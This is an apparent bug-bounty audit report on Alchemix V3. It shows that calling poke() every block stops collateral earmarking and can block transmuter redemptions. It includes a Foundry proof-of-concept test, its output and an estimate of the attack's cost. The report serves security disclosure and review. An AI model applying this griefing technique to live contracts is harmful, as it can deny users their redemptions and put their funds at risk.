# 57066 sc critical a malicious actor can keep calling poke at every block to prevent collateral earmarking exposing transmuter users to delayed redemptions and loss of funds

**Submitted on Oct 23rd 2025 at 08:03:45 UTC by @Oxdeadmanwalking for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57066
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

By calling `poke()` on every block to trigger an `_earmark`, an attacker forces `queryGraph(n, n)` to return 0, preventing the three critical earmarking variables (`cumulativeEarmarked`, `_earmarkWeight`, `_survivalAccumulator`) from updating. This can in turn break transmuter redemptions which rely on earmarked debt.

## Vulnerability Details

Global earmarking of user collateral for redemptions happens through the `_earmark` function which is called upon every state changing call to the Alchemist contract.

The function first calculates the amount to be earmarked by querying the rolling amount of queued alAssets for redemption from `lastEarmarkBlock` up to the current block using the `StakingGraph` of the transmuter.

```solidity
        uint256 amount = ITransmuter(transmuter).queryGraph(lastEarmarkBlock + 1, block.number);
```

In Transmuter:

```
    function queryGraph(uint256 startBlock, uint256 endBlock) external view returns (uint256) {
        if (endBlock <= startBlock) return 0;

        int256 queried = _stakingGraph.queryStake(startBlock, endBlock);
        if (queried == 0) return 0;

        // You currently add +1 for rounding; keep in mind this can create off-by-one deltas.
        return (queried / BLOCK_SCALING_FACTOR).toUint256()
            + (queried % BLOCK_SCALING_FACTOR == 0 ? 0 : 1);
    }
```

After the amount if obtained, `_earmark` updates global state related to redemptions (namely, `_survivalAccumulator` , `_earmarkWeight` and `cumulativeEarmarked`)

```
        if (amount > 0 && liveUnearmarked != 0) {
            // Previous earmark survival
            uint256 previousSurvival = PositionDecay.SurvivalFromWeight(_earmarkWeight);
            if (previousSurvival == 0) previousSurvival = ONE_Q128;

            // Fraction of unearmarked debt being earmarked now in UQ128.128
            uint256 earmarkedFraction = _divQ128(amount, liveUnearmarked);

@>            _survivalAccumulator += _mulQ128(previousSurvival, earmarkedFraction);
 @>          _earmarkWeight += PositionDecay.WeightIncrement(amount, liveUnearmarked);

 @>         cumulativeEarmarked += amount;
        }
```

At the end of the call, `_earmark` updates the `lastEarmarkBlock` to prevent double counting on subsequent calls

```solidity
 lastEarmarkBlock = block.number;
```

However, `lastEarmarkBlock` gets updated even if the `amount` returned by the staking graph is 0.

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/Transmuter.sol#L269-L271>

Lets see how we can trigger this state.

1. Suppose `lastEarmarkBlock` is 1000. On the next block we call a non privileged state changing function such as `poke()` to trigger an earmark at block 1001.
2. The staking graph of the transmuter is queried for \[`lastEarmarkBlock+1`, block.number] which corresponds to \[1001,1001], meaning just 1 block.
3. `queryGraph` however, returns 0 by default if `startBlock == endBlock`

```
if (endBlock <= startBlock) return 0;
```

4. As a result the amount for earmarking to be returned will be 0. And the if statement that updates the weights and cumulative earmark amounts will be skipped inside `_earmark`. The `lastEarmarkBlock` however will get updated to `block.number` which is 1001.
5. We have now essentially skipped a block of earmarking. We can keep repeating this and calling `poke()` for subsequent blocks to prevent earmarks from ever accumulating for this time period.

The cost of this is trivial. To prevent earmarking for an hour assuming the following parameters on ETH mainnet:

* 300 blocks/hour (12sec block times)
* 74475 gas for an isolated `poke()` in test scenarios
* 0.0000000005 ETH per gas (\~average gas price on Mainnet over the past months)
* 4000 USD ETH price 300 \* (74475 \* 0.0000000005 \* 4000) == \~44 USD

## Impact Details

The impact is that the redemption and earmarking mechanism gets broken for the time period of the attack as debt that should have gotten earmarked never does. Focusing on `cumulativeEarmarked` not updating, `Alchemist.redeem` will return a 0 amount of tokens back to the Transmuter upon a redemption. <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/Transmuter.sol#L232C13-L232C27> As a result, redemptions will fail and users will not be able to claim the underlying even if their position has fully matured.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L1098-L1132>

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/Transmuter.sol#L269-L278>

## Proof of Concept

## Proof of Concept

1. Add this test to `AlchemistV3.t.sol` at the end of the file

```solidity
    /// @notice PoC: Poke spam attack prevents earmarking, breaking transmuter redemptions
    function test_POC_poke_spam_breaks_transmuter_redemptions() public {
        // Create accounts
        address attacker = makeAddr("attacker");
        address borrower = address(0xbeef);

        // Step1: Create borrower with debt
        vm.startPrank(borrower);
        SafeERC20.safeApprove(address(vault), address(alchemist), 1000e18);
        alchemist.deposit(1000e18, borrower, 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(borrower, address(alchemistNFT));
        alchemist.mint(tokenId, 500e18, borrower);
        vm.stopPrank();

        // Step2: Create redemption request
        vm.startPrank(attacker);
        deal(address(alToken), attacker, 100e18);
        TokenUtils.safeApprove(address(alToken), address(transmuterLogic), 100e18);
        transmuterLogic.createRedemption(100e18);
        vm.stopPrank();

        // assert that total debt is 500e18, which means that liveUnearmarked should be 500e18
        assertEq(alchemist.totalDebt(), 500e18);
        console.log("Total debt: ", alchemist.totalDebt());

        uint256 earmarkedBefore = alchemist.cumulativeEarmarked();
        console.log("Earmarked before attack:", earmarkedBefore);
        console.log("Block number before attack: ", block.number);
        console.log("lastEarmarkBlock before attack: ", alchemist.lastEarmarkBlock());

        // Step3: Attacker spams poke() every block with any positon id to prevent earmarking
        uint256 blocksToRoll = 10;
        vm.startPrank(attacker);
        for (uint256 i = 0; i < blocksToRoll; i++) {
            vm.roll(block.number + 1);
            alchemist.poke(tokenId);
        }
        vm.stopPrank();

        // Step4: Check that earmarking has been prevented and cummulative earmakred remains unchanged
        // This in turn will cause the collateralAmount to be sent to the transmuter upon the transmuter
        // calling redeem() on alchemist to be 0, effectively blocking redemptions when the trnsmuter 
        // does not have enough collateral in MYT to cover the redemption
        uint256 earmarkedAfter = alchemist.cumulativeEarmarked();
        console.log("Earmarked after attack: ", earmarkedAfter);
        console.log("Block number after attack: ", block.number);
        console.log("lastEarmarkBlock after attack: ", alchemist.lastEarmarkBlock());
        assertEq(earmarkedAfter, earmarkedBefore, "Earmarking should have been prevented");
    }
```

3. The output should look like the following.

```bash
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] test_POC_poke_spam_breaks_transmuter_redemptions() (gas: 3061655)
Logs:
  Total debt:  500000000000000000000
  Earmarked before attack: 0
  Block number before attack:  1
  lastEarmarkBlock before attack:  1
  Earmarked after attack:  0
  Block number after attack:  11
  lastEarmarkBlock after attack:  11
```

Note how the `lastEarmarkBlock` has increased without earmarked debt ever updating for that time period
